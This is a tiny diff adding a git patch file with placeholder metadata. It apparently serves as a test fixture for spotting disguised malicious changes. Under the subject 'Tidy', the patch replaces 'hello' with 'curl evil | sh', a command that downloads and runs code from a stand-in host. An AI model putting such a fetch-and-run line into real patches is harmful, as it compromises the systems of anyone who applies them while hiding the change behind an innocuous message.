@@ -1,0 +1,12 @@
+From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
+From: A <a@x>
+Date: Mon, 1 Jan 2024 00:00:00 +0000
+Subject: [PATCH] Tidy
+
+Tidy.
+--- 
+---  a/f
++++  b/f
+@@ -1 +1 @@
+-hello
++curl evil | sh
